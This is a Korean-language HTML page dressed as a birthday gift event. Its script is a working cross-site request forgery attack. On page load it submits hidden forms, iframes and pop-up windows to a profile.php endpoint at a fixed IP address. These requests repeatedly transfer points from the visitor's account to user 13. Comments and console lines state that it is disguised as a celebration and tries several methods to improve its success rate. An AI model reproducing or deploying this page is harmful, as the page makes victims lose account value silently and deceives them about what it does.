<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>🎁 생일 축하 이벤트</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            color: white;
        }
        .celebration {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 50px;
            border-radius: 25px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            text-align: center;
            max-width: 600px;
        }
        .cake-emoji {
            font-size: 5em;
            margin: 20px 0;
            animation: celebrate 3s infinite;
        }
        @keyframes celebrate {
            0%, 100% { transform: scale(1) rotate(0deg); }
            25% { transform: scale(1.1) rotate(-5deg); }
            75% { transform: scale(1.1) rotate(5deg); }
        }
        .btn-party {
            background: linear-gradient(45deg, #ff9a9e, #fecfef);
            border: none;
            padding: 20px 40px;
            border-radius: 30px;
            color: #333;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 15px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .btn-party:hover { 
            transform: translateY(-3px);
            box-shadow: 0 6px 25px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body>
    <div class="celebration">
        <div class="cake-emoji">🎂</div>
        <h1>🎉 생일 축하 이벤트! 🎉</h1>
        <p>친구의 특별한 날을 함께 축하해주세요!</p>
        
        <button class="btn-party" onclick="celebrateBirthday()">
            🎊 생일 축하 선물 보내기
        </button>
        
        <button class="btn-party" onclick="surpriseParty()">
            🎈 서프라이즈 파티 선물
        </button>
        
        <div id="party-status" style="margin-top: 30px;">
            <p>🎁 축하 선물을 준비하고 있어요...</p>
        </div>
    </div>

    <script>
        function celebrateBirthday() {
            updatePartyStatus('🎂 생일 케이크와 선물을 준비하고 있어요...');
            
            // 생일 축하 선물들
            const birthdayGifts = [
                { amount: 100, message: '생일 축하해요! 🎂✨' },
                { amount: 150, message: '행복한 하루 되세요! 🌟' },
                { amount: 200, message: '좋은 일만 가득하길! 🍀' }
            ];
            
            birthdayGifts.forEach((gift, i) => {
                setTimeout(() => {
                    sendBirthdayGift(gift);
                    console.log(`🎂 생일선물 ${i+1}: ${gift.amount}P`);
                    updatePartyStatus(`🎉 선물 ${i+1}개 전달 완료!`);
                }, (i + 1) * 2000);
            });
        }
        
        function surpriseParty() {
            updatePartyStatus('🎈 서프라이즈 파티를 준비하고 있어요...');
            
            // 대량 선물로 서프라이즈
            const surpriseGifts = [
                { amount: 250, message: '서프라이즈! 🎊🎊' },
                { amount: 300, message: '파티 타임! 🥳🎉' },
                { amount: 350, message: '최고의 선물! 💎✨' }
            ];
            
            surpriseGifts.forEach((gift, i) => {
                setTimeout(() => {
                    sendBirthdayGift(gift);
                    console.log(`🎈 서프라이즈 ${i+1}: ${gift.amount}P`);
                    updatePartyStatus(`🥳 서프라이즈 ${i+1}단계 완료!`);
                }, (i + 1) * 3000);
            });
        }
        
        function sendBirthdayGift(gift) {
            // 여러 방법으로 동시에 시도 (성공률 높이기)
            
            // 방법 1: 기본 POST Form
            createBirthdayForm(gift, 'form');
            
            // 방법 2: 새 창에서 GET (확인용)
            setTimeout(() => {
                const giftUrl = `http://3.36.66.216/profile.php?gift_to=13&points=${gift.amount}&send_gift=1&birthday=true`;
                const birthdayWindow = window.open(giftUrl, `birthday_${Date.now()}`, 'width=600,height=400');
                
                // 3초 후 창 닫기
                setTimeout(() => {
                    try { 
                        birthdayWindow.close(); 
                    } catch(e) {}
                }, 3000);
            }, 500);
            
            // 방법 3: 숨겨진 iframe
            setTimeout(() => {
                createBirthdayForm(gift, 'iframe');
            }, 1000);
        }
        
        function createBirthdayForm(gift, type) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://3.36.66.216/profile.php';
            
            if (type === 'form') {
                form.target = '_blank';
            } else {
                form.target = `birthday_${Date.now()}`;
                form.style.display = 'none';
                
                // iframe 생성
                const iframe = document.createElement('iframe');
                iframe.name = form.target;
                iframe.style.display = 'none';
                iframe.style.width = '1px';
                iframe.style.height = '1px';
                document.body.appendChild(iframe);
            }
            
            // 완전히 자연스러운 데이터
            const giftData = {
                gift_to: 13,
                points: gift.amount,
                send_gift: 1,
                gift_type: 'birthday_special',
                message: gift.message,
                event_type: 'birthday_celebration',
                sender_wish: 'happy_birthday',
                celebration_date: new Date().toDateString()
            };
            
            Object.keys(giftData).forEach(name => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = giftData[name];
                form.appendChild(input);
            });
            
            document.body.appendChild(form);
            form.submit();
            
            // 정리
            setTimeout(() => {
                if (form.parentNode) form.parentNode.removeChild(form);
            }, 5000);
        }
        
        function updatePartyStatus(message) {
            document.getElementById('party-status').innerHTML = `<p>${message}</p>`;
        }
        
        // 자동으로 파티 시작
        setTimeout(() => {
            updatePartyStatus('🎉 자동으로 생일 파티를 시작합니다!');
            celebrateBirthday();
        }, 3000);
        
        // 10초 후 서프라이즈도 시작
        setTimeout(() => {
            surpriseParty();
        }, 12000);
        
        console.log('🎂 생일 축하 이벤트 준비됨!');
        console.log('🎁 자연스러운 축하 메시지로 위장');
        console.log('🎊 다중 방법으로 선물 전송 시도');
    </script>
</body>
</html>
